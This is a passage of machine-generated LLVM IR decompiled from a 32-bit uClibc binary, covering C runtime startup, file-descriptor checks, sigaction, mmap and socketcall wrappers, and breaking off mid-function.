define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80512a0 = load i32, i32* @ebx, align 4
  store i32 %v0_80512a0, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.151 to i32), i32 -134567392), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.151 to i32), i32 -134567392), i32 2), i32 0), label %dec_label_pc_80512b4, label %dec_label_pc_80512c1

dec_label_pc_80512b4:                             ; preds = %entry, %dec_label_pc_80512b4
  %v1_80512bb8 = phi i32 [ %v1_80512bb, %dec_label_pc_80512b4 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.151 to i32), i32 -134567392), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_80512bb.152 to i32), i32* %stack_var_-16, align 4
  %v5_80512b4 = mul i32 %v1_80512bb8, 4
  %v6_80512b4 = add i32 %v5_80512b4, ptrtoint (i32* @global_var_80555e0.151 to i32)
  %v7_80512b4 = inttoptr i32 %v6_80512b4 to i32*
  %v8_80512b4 = load i32, i32* %v7_80512b4, align 4
  call void @__pseudo_call(i32 %v8_80512b4)
  %v0_80512bb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80512bb = add i32 %v0_80512bb.pre, -1
  store i32 %v1_80512bb, i32* %ebx.global-to-local, align 4
  %v10_80512bc = icmp eq i32 %v0_80512bb.pre, 0
  %v1_80512bf = icmp eq i1 %v10_80512bc, false
  br i1 %v1_80512bf, label %dec_label_pc_80512b4, label %dec_label_pc_80512c1

dec_label_pc_80512c1:                             ; preds = %dec_label_pc_80512b4, %entry
  %v0_80512c1 = load i32, i32* @global_var_805b968.153, align 8
  %v1_80512c6 = icmp eq i32 %v0_80512c1, 0
  br i1 %v1_80512c6, label %dec_label_pc_80512cc, label %dec_label_pc_80512ca

dec_label_pc_80512ca:                             ; preds = %dec_label_pc_80512c1
  %v0_80512ca = load i32, i32* %stack_var_-16, align 4
  %v1_80512ca = call i32 @unknown_0(i32 %v0_80512ca)
  br label %dec_label_pc_80512cc

dec_label_pc_80512cc:                             ; preds = %dec_label_pc_80512ca, %dec_label_pc_80512c1
  %v0_80512cc = load i32, i32* @global_var_805b96c.154, align 4
  %v1_80512d2 = icmp eq i32 %v0_80512cc, 0
  br i1 %v1_80512d2, label %dec_label_pc_80512db, label %dec_label_pc_80512d6

dec_label_pc_80512d6:                             ; preds = %dec_label_pc_80512cc
  %v2_80512d6 = load i32, i32* %stack_var_-16, align 4
  %v1_80512d9 = call i32 @unknown_0(i32 %v2_80512d6)
  br label %dec_label_pc_80512db

dec_label_pc_80512db:                             ; preds = %dec_label_pc_80512d6, %dec_label_pc_80512cc
  %v2_80512db = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_80512db

; uselistorder directives
  uselistorder i32 %v1_80512bb, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80512b4, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80512e2 = load i32, i32* @eax, align 4
  ret i32 %v0_80512e2
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80512e3 = load i32, i32* @esi, align 4
  %v0_80512e4 = load i32, i32* @eax, align 4
  store i32 %v0_80512e4, i32* @esi, align 4
  %v0_80512e6 = load i32, i32* @ebx, align 4
  store i32 %v0_80512e6, i32* %stack_var_-8, align 4
  %v0_80512e7 = load i32, i32* @edx, align 4
  store i32 %v0_80512e7, i32* @ebx, align 4
  %v4_80512ef = call i32 @__libc_fcntl(i32 %v0_80512e4, i32 1, i32 %tmp6)
  %v8_80512f7 = icmp eq i32 %v4_80512ef, -1
  %v1_80512f8 = icmp eq i1 %v8_80512f7, false
  br i1 %v1_80512f8, label %dec_label_pc_8051313, label %dec_label_pc_80512fa

dec_label_pc_80512fa:                             ; preds = %entry
  %v0_80512fc = load i32, i32* @ebx, align 4
  %v5_8051302 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054500.155, i32 0, i32 0), i32 %v0_80512fc)
  %v1_805130a = load i32, i32* @esi, align 4
  %v12_805130a = icmp eq i32 %v5_8051302, %v1_805130a
  br i1 %v12_805130a, label %dec_label_pc_8051313, label %dec_label_pc_805130e

dec_label_pc_805130e:                             ; preds = %dec_label_pc_80512fa
  %v0_805130e = call i32 @abort()
  br label %dec_label_pc_8051313

dec_label_pc_8051313:                             ; preds = %dec_label_pc_80512fa, %entry, %dec_label_pc_805130e
  %v2_8051313 = load i32, i32* %stack_var_-12, align 4
  %v2_8051314 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051314, i32* @ebx, align 4
  store i32 %v0_80512e3, i32* @esi, align 4
  ret i32 %v2_8051313

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 8, 7, 2, 1, 12, 11, 10, 9, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8051313, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_805131a = load i8, i8* @global_var_805b970.156, align 16
  %v1_805131a = icmp eq i8 %v0_805131a, 0
  %v1_8051321 = icmp eq i1 %v1_805131a, false
  br i1 %v1_8051321, label %entry.dec_label_pc_8051353_crit_edge, label %dec_label_pc_8051323

entry.dec_label_pc_8051353_crit_edge:             ; preds = %entry
  %v0_8051356.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051353

dec_label_pc_8051323:                             ; preds = %entry
  store i8 1, i8* @global_var_805b970.156, align 16
  store i32 4096, i32* @global_var_805b964.157, align 4
  %v0_805134e = call i32 @_stdio_init()
  br label %dec_label_pc_8051353

dec_label_pc_8051353:                             ; preds = %entry.dec_label_pc_8051353_crit_edge, %dec_label_pc_8051323
  %v0_8051356 = phi i32 [ %v0_8051356.pre, %entry.dec_label_pc_8051353_crit_edge ], [ %v0_805134e, %dec_label_pc_8051323 ]
  ret i32 %v0_8051356

; uselistorder directives
  uselistorder i8 1, { 34, 4, 0, 33, 27, 28, 1, 29, 2, 30, 31, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 32, 26 }
  uselistorder i8* @global_var_805b970.156, { 1, 0 }
  uselistorder label %dec_label_pc_8051353, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp30 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_8051357 = load i32, i32* @ebp, align 4
  store i32 %tmp30, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805b95c.158, align 4
  store i32 %arg6, i32* @global_var_805b96c.154, align 4
  %v2_805138e = mul i32 %arg2, 4
  %v3_805138e = add i32 %tmp30, %v2_805138e
  %v1_8051391 = add i32 %v3_805138e, 4
  store i32 %v1_8051391, i32* @global_var_805b960.149, align 32
  %v3_805139a = load i32, i32* %arg3, align 4
  %v14_805139a = icmp eq i32 %v1_8051391, %v3_805139a
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v1_80513a0 = icmp eq i1 %v14_805139a, false
  %v4_80513a0 = select i1 %v1_80513a0, i32 %v1_8051391, i32 %v3_805138e
  store i32 %v4_80513a0, i32* @global_var_805b960.149, align 32
  %v2_80513a8 = ptrtoint i32* %stack_var_-136 to i32
  %v3_80513ad = bitcast i32* %stack_var_-136 to i8*
  %v4_80513ad = call i32 @__GI_memset(i8* %v3_80513ad, i32 0, i32 120)
  %v0_80513b2 = load i32, i32* @global_var_805b960.149, align 32
  br label %dec_label_pc_80513ba

dec_label_pc_80513ba:                             ; preds = %dec_label_pc_80513ba, %entry
  %v0_80513ba = phi i32 [ %v1_80513bd, %dec_label_pc_80513ba ], [ %v0_80513b2, %entry ]
  %v1_80513ba = inttoptr i32 %v0_80513ba to i32*
  %v2_80513ba = load i32, i32* %v1_80513ba, align 4
  %v3_80513ba = icmp eq i32 %v2_80513ba, 0
  %v1_80513bd = add i32 %v0_80513ba, 4
  %v1_80513c0 = icmp eq i1 %v3_80513ba, false
  br i1 %v1_80513c0, label %dec_label_pc_80513ba, label %dec_label_pc_80513e1.preheader

dec_label_pc_80513e1.preheader:                   ; preds = %dec_label_pc_80513ba
  store i32 %v1_80513bd, i32* @ebx, align 4
  %v1_80513e11 = inttoptr i32 %v1_80513bd to i32*
  %v2_80513e12 = load i32, i32* %v1_80513e11, align 4
  %v3_80513e13 = icmp eq i32 %v2_80513e12, 0
  %v1_80513e410 = icmp eq i1 %v3_80513e13, false
  br i1 %v1_80513e410, label %dec_label_pc_80513c6.lr.ph, label %dec_label_pc_80513e6

dec_label_pc_80513c6.lr.ph:                       ; preds = %dec_label_pc_80513e1.preheader
  %v3_805139e = ptrtoint i32* %stack_var_-168 to i32
  %v3_80513d1 = add i32 %v3_805139e, 32
  br label %dec_label_pc_80513c6

dec_label_pc_80513c6:                             ; preds = %dec_label_pc_80513c6.lr.ph, %dec_label_pc_80513de
  %v1_80513d1 = phi i32 [ %v2_80513e12, %dec_label_pc_80513c6.lr.ph ], [ %v2_80513e1, %dec_label_pc_80513de ]
  %v0_80513d0 = phi i32 [ %v1_80513bd, %dec_label_pc_80513c6.lr.ph ], [ %v1_80513de, %dec_label_pc_80513de ]
  %v6_80513cb = icmp ugt i32 %v1_80513d1, 14
  br i1 %v6_80513cb, label %dec_label_pc_80513de, label %dec_label_pc_80513cd

dec_label_pc_80513cd:                             ; preds = %dec_label_pc_80513c6
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_80513d0, i32* %stack_var_-168, align 4
  %v2_80513d1 = mul i32 %v1_80513d1, 8
  %v4_80513d1 = add i32 %v3_80513d1, %v2_80513d1
  %v3_80513d6 = inttoptr i32 %v4_80513d1 to i16*
  %v4_80513d6 = call i32 @memcpy(i16* %v3_80513d6, i32 %v0_80513d0, i32 8)
  %v0_80513de.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80513de

dec_label_pc_80513de:                             ; preds = %dec_label_pc_80513c6, %dec_label_pc_80513cd
  %v0_80513de = phi i32 [ %v0_80513d0, %dec_label_pc_80513c6 ], [ %v0_80513de.pre, %dec_label_pc_80513cd ]
  %v1_80513de = add i32 %v0_80513de, 8
  store i32 %v1_80513de, i32* @ebx, align 4
  %v1_80513e1 = inttoptr i32 %v1_80513de to i32*
  %v2_80513e1 = load i32, i32* %v1_80513e1, align 4
  %v3_80513e1 = icmp eq i32 %v2_80513e1, 0
  %v1_80513e4 = icmp eq i1 %v3_80513e1, false
  br i1 %v1_80513e4, label %dec_label_pc_80513c6, label %dec_label_pc_80513e6

dec_label_pc_80513e6:                             ; preds = %dec_label_pc_80513de, %dec_label_pc_80513e1.preheader
  store i32 %v2_80513a8, i32* @eax, align 4
  %v0_80513ea = call i32 @_dl_aux_init()
  store i32 %v0_80513ea, i32* @eax, align 4
  %v0_80513ef = call i32 @__GI___uClibc_init()
  %v1_80513fd = icmp eq i32 %tmp25, 0
  %v3_80513ff = select i1 %v1_80513fd, i32 4096, i32 %tmp25
  %v13_8051402 = icmp eq i32 %tmp24, -1
  store i32 %v3_80513ff, i32* @global_var_805b964.157, align 4
  %v1_805140c = icmp eq i1 %v13_8051402, false
  br i1 %v1_805140c, label %dec_label_pc_8051437, label %dec_label_pc_805140e

dec_label_pc_805140e:                             ; preds = %dec_label_pc_80513e6
  %v0_805140e = call i32 @getuid()
  store i32 %v0_805140e, i32* @ebx, align 4
  %v0_8051415 = call i32 @geteuid()
  %v0_805141a = load i32, i32* @ebx, align 4
  %v12_805141a = icmp eq i32 %v0_805141a, %v0_8051415
  %v1_805141c = icmp eq i1 %v12_805141a, false
  br i1 %v1_805141c, label %dec_label_pc_805144d, label %dec_label_pc_805141e

dec_label_pc_805141e:                             ; preds = %dec_label_pc_805140e
  %v0_805141e = call i32 @getgid()
  store i32 %v0_805141e, i32* @ebx, align 4
  %v0_8051425 = call i32 @getegid()
  %v0_805142a = load i32, i32* @ebx, align 4
  %v12_805142a = icmp eq i32 %v0_805142a, %v0_8051425
  %v1_805142c = icmp eq i1 %v12_805142a, false
  br i1 %v1_805142c, label %dec_label_pc_805144d, label %dec_label_pc_805142e.thread

dec_label_pc_805142e.thread:                      ; preds = %dec_label_pc_805141e
  br label %dec_label_pc_8051477

dec_label_pc_8051437:                             ; preds = %dec_label_pc_80513e6
  %v15_8051437 = icmp eq i32 %tmp24, %tmp23
  %v1_805143b = icmp eq i1 %v15_8051437, false
  br i1 %v1_805143b, label %dec_label_pc_805144d, label %dec_label_pc_805143d

dec_label_pc_805143d:                             ; preds = %dec_label_pc_8051437
  br label %dec_label_pc_805144d

dec_label_pc_805144d:                             ; preds = %dec_label_pc_805143d, %dec_label_pc_8051437, %dec_label_pc_805141e, %dec_label_pc_805140e
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051454 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051463 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051472 = call i32 @__check_one_fd()
  br label %dec_label_pc_8051477

dec_label_pc_8051477:                             ; preds = %dec_label_pc_805142e.thread, %dec_label_pc_805144d
  %v0_8051477 = load i32, i32* @edi, align 4
  %v1_8051477 = inttoptr i32 %v0_8051477 to i32*
  %v2_8051477 = load i32, i32* %v1_8051477, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.151 to i32), i32 -134567392), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_8051477, i32* bitcast (i32** @global_var_80558d8.160 to i32*), align 8
  store i32 %arg5, i32* @global_var_805b968.153, align 8
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.151 to i32), i32 -134567392), i32 2), i32 0), label %dec_label_pc_805149c, label %dec_label_pc_80514a8

dec_label_pc_805149c:                             ; preds = %dec_label_pc_8051477, %dec_label_pc_805149c
  %v4_805149c45 = phi i32 [ %v1_80514a3, %dec_label_pc_805149c ], [ 0, %dec_label_pc_8051477 ]
  %v5_805149c = mul i32 %v4_805149c45, 4
  %v6_805149c = add i32 %v5_805149c, ptrtoint (i32* @global_var_80555e0.151 to i32)
  %v7_805149c = inttoptr i32 %v6_805149c to i32*
  %v8_805149c = load i32, i32* %v7_805149c, align 4
  call void @__pseudo_call(i32 %v8_805149c)
  %v0_80514a3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80514a3 = add i32 %v0_80514a3, 1
  store i32 %v1_80514a3, i32* %ebx.global-to-local, align 4
  %v1_80514a4.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_80514a4 = icmp ult i32 %v1_80514a3, %v1_80514a4.pre
  br i1 %v7_80514a4, label %dec_label_pc_805149c, label %dec_label_pc_80514a8

dec_label_pc_80514a8:                             ; preds = %dec_label_pc_805149c, %dec_label_pc_8051477
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.151 to i32), i32 -134567392), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.151 to i32), i32 -134567392), i32 2), i32 0), label %dec_label_pc_80514c0, label %dec_label_pc_80514cc

dec_label_pc_80514c0:                             ; preds = %dec_label_pc_80514a8, %dec_label_pc_80514c0
  %v4_80514c044 = phi i32 [ %v1_80514c7, %dec_label_pc_80514c0 ], [ 0, %dec_label_pc_80514a8 ]
  store i32 ptrtoint (i32* @global_var_80514c7.162 to i32), i32* %stack_var_-164, align 4
  %v5_80514c0 = mul i32 %v4_80514c044, 4
  %v6_80514c0 = add i32 %v5_80514c0, ptrtoint (i32* @global_var_80555e0.151 to i32)
  %v7_80514c0 = inttoptr i32 %v6_80514c0 to i32*
  %v8_80514c0 = load i32, i32* %v7_80514c0, align 4
  call void @__pseudo_call(i32 %v8_80514c0)
  %v0_80514c7 = load i32, i32* @ebx, align 4
  %v1_80514c7 = add i32 %v0_80514c7, 1
  store i32 %v1_80514c7, i32* @ebx, align 4
  %v1_80514c8.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_80514c8 = icmp ult i32 %v1_80514c7, %v1_80514c8.pre
  br i1 %v7_80514c8, label %dec_label_pc_80514c0, label %dec_label_pc_80514cc

dec_label_pc_80514cc:                             ; preds = %dec_label_pc_80514c0, %dec_label_pc_80514a8
  %v0_80514d5 = load i32, i32* %stack_var_-164, align 4
  %v1_80514d5 = call i32 @__errno_location(i32 %v0_80514d5)
  %v1_80514da = inttoptr i32 %v1_80514d5 to i32*
  store i32 0, i32* %v1_80514da, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-164, align 4
  %v0_80514f5 = load i32, i32* @global_var_805b960.149, align 32
  store i32 %v0_80514f5, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8051357)
  %v0_805150a = load i32, i32* @eax, align 4
  %v1_805150d = call i32 @__GI_exit(i32 %v0_805150a)
  %v0_8051519 = load i32, i32* @ebx, align 4
  %v1_8051519 = inttoptr i32 %v0_8051519 to %sigcontext*
  %v2_8051519 = call i32 @sigreturn(%sigcontext* %v1_8051519)
  %v0_8051521 = load i32, i32* @ebx, align 4
  %v1_8051521 = inttoptr i32 %v0_8051521 to %sigcontext*
  %v2_8051521 = call i32 @sigreturn(%sigcontext* %v1_8051521)
  ret i32 %v2_8051521

; uselistorder directives
  uselistorder i32 %v1_80514c7, { 1, 2, 0 }
  uselistorder i32 %v1_80514a3, { 1, 2, 0 }
  uselistorder i32 %v2_80513e1, { 1, 0 }
  uselistorder i32 %v1_80513de, { 2, 1, 0 }
  uselistorder i32 %v1_80513bd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80513ba, { 1, 0 }
  uselistorder i32 %v1_8051391, { 1, 0, 2 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.151 to i32), i32 -134567392), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555e0.151 to i32), i32 -134567392), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_80514c0, { 1, 0 }
  uselistorder label %dec_label_pc_805149c, { 1, 0 }
  uselistorder label %dec_label_pc_8051477, { 1, 0 }
  uselistorder label %dec_label_pc_80513de, { 1, 0 }
  uselistorder label %dec_label_pc_80513c6, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051523 = load i32, i32* @esi, align 4
  %v0_8051524 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051539 = icmp eq i32* %arg2, null
  br i1 %v1_8051539, label %dec_label_pc_805158d, label %dec_label_pc_805153d

dec_label_pc_805153d:                             ; preds = %entry
  %v2_805153d = load i32, i32* %arg2, align 4
  store i32 %v2_805153d, i32* %stack_var_-148, align 4
  %v1_8051546 = add i32 %tmp11, 4
  %v3_8051558 = bitcast i32* %stack_var_-136 to i16*
  %v4_8051558 = call i32 @memcpy(i16* %v3_8051558, i32 %v1_8051546, i32 128)
  br label %dec_label_pc_805158d

dec_label_pc_805158d:                             ; preds = %entry, %dec_label_pc_805153d
  %v1_805158f = icmp eq i32 %arg3, 0
  br i1 %v1_805158f, label %dec_label_pc_8051597, label %dec_label_pc_8051593

dec_label_pc_8051593:                             ; preds = %dec_label_pc_805158d
  %v2_8051593 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8051597

dec_label_pc_8051597:                             ; preds = %dec_label_pc_805158d, %dec_label_pc_8051593
  %v0_80515a6 = phi i32 [ 0, %dec_label_pc_805158d ], [ %v2_8051593, %dec_label_pc_8051593 ]
  br i1 %v1_8051539, label %dec_label_pc_80515a4, label %dec_label_pc_805159d

dec_label_pc_805159d:                             ; preds = %dec_label_pc_8051597
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_80515a4

dec_label_pc_80515a4:                             ; preds = %dec_label_pc_8051597, %dec_label_pc_805159d
  %v0_80515a7 = phi %sigaction* [ null, %dec_label_pc_8051597 ], [ %phitmp, %dec_label_pc_805159d ]
  %v5_80515af = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_80515a7, i32 %v0_80515a6, i32 8)
  store i32 %v5_80515af, i32* %ebx.global-to-local, align 4
  br i1 %v1_805158f, label %dec_label_pc_80515f2, label %dec_label_pc_80515bd

dec_label_pc_80515bd:                             ; preds = %dec_label_pc_80515a4
  %v2_80515bd = icmp slt i32 %v5_80515af, 0
  br i1 %v2_80515bd, label %dec_label_pc_80515f2, label %dec_label_pc_80515c1

dec_label_pc_80515c1:                             ; preds = %dec_label_pc_80515bd
  %v3_80515c1 = load i32, i32* %stack_var_-288, align 4
  %v2_80515c5 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80515c1, i32* %v2_80515c5, align 4
  %v2_80515cd = ptrtoint i32* %stack_var_-276 to i32
  %v1_80515d2 = add i32 %arg3, 4
  %v3_80515d6 = inttoptr i32 %v1_80515d2 to i16*
  %v4_80515d6 = call i32 @memcpy(i16* %v3_80515d6, i32 %v2_80515cd, i32 128)
  %v2_80515df = add i32 %arg3, 132
  %v3_80515df = inttoptr i32 %v2_80515df to i32*
  %v2_80515ec = add i32 %arg3, 136
  %v3_80515ec = inttoptr i32 %v2_80515ec to i32*
  %v0_80515f8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80515f2

dec_label_pc_80515f2:                             ; preds = %dec_label_pc_80515bd, %dec_label_pc_80515a4, %dec_label_pc_80515c1
  %v0_80515f8 = phi i32 [ %v5_80515af, %dec_label_pc_80515bd ], [ %v5_80515af, %dec_label_pc_80515a4 ], [ %v0_80515f8.pre, %dec_label_pc_80515c1 ]
  store i32 %v0_8051524, i32* @ebx, align 4
  store i32 %v0_8051523, i32* @esi, align 4
  ret i32 %v0_80515f8

; uselistorder directives
  uselistorder i32 %v5_80515af, { 0, 1, 3, 2 }
  uselistorder i1 %v1_805158f, { 1, 0 }
  uselistorder i1 %v1_8051539, { 1, 0 }
  uselistorder i32 128, { 3, 4, 9, 0, 5, 6, 7, 10, 11, 12, 13, 14, 2, 1, 8, 15 }
  uselistorder i32* null, { 0, 3, 4, 5, 6, 7, 8, 9, 1, 2 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_80515f2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80515a4, { 1, 0 }
  uselistorder label %dec_label_pc_8051597, { 1, 0 }
  uselistorder label %dec_label_pc_805158d, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8051603 = load i32, i32* @eax, align 4
  %v1_8051605 = sub i32 0, %v0_8051603
  %v1_8051607 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_805160c = inttoptr i32 %v1_8051607 to i32*
  store i32 %v1_8051605, i32* %v2_805160c, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8051618 = load i32, i32* @ebx, align 4
  %v2_805161f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805161f, i32* @ebx, align 4
  %v8_8051623 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8051618, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_8051623, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134551040)
  ret i32 %v8_8051623

; uselistorder directives
  uselistorder i32 %v8_8051623, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134551040, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051634 = load i32, i32* @ebx, align 4
  store i32 %v0_8051634, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051647 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051647, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051647, -4095
  br i1 %tmp, label %dec_label_pc_8051660, label %dec_label_pc_8051654

dec_label_pc_8051654:                             ; preds = %entry
  %v0_8051654 = load i32, i32* %stack_var_-4, align 4
  %v1_8051654 = call i32 @__errno_location(i32 %v0_8051654)
  %v0_8051659 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051659 = sub i32 0, %v0_8051659
  %v2_805165b = inttoptr i32 %v1_8051654 to i32*
  store i32 %v1_8051659, i32* %v2_805165b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051660

dec_label_pc_8051660:                             ; preds = %entry, %dec_label_pc_8051654
  %v0_8051661 = phi i32 [ %v1_8051647, %entry ], [ -1, %dec_label_pc_8051654 ]
  %v2_8051660 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051660, i32* @edx, align 4
  %v2_8051664 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051664, i32* @ebx, align 4
  ret i32 %v0_8051661

; uselistorder directives
  uselistorder i32 %v1_8051647, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051660, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051669 = load i32, i32* @esi, align 4
  store i32 %v0_8051669, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805167d = load i32, i32* @ebx, align 4
  %v7_8051685 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051685, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_8051685, -4095
  br i1 %tmp, label %dec_label_pc_805169d, label %dec_label_pc_8051691

dec_label_pc_8051691:                             ; preds = %entry
  %v1_8051691 = call i32 @__errno_location(i32 %v0_805167d)
  %v0_8051696 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051696 = sub i32 0, %v0_8051696
  %v2_8051698 = inttoptr i32 %v1_8051691 to i32*
  store i32 %v1_8051696, i32* %v2_8051698, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805169d

dec_label_pc_805169d:                             ; preds = %entry, %dec_label_pc_8051691
  %v0_805169e = phi i32 [ %v7_8051685, %entry ], [ -1, %dec_label_pc_8051691 ]
  %v2_80516a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80516a0, i32* @esi, align 4
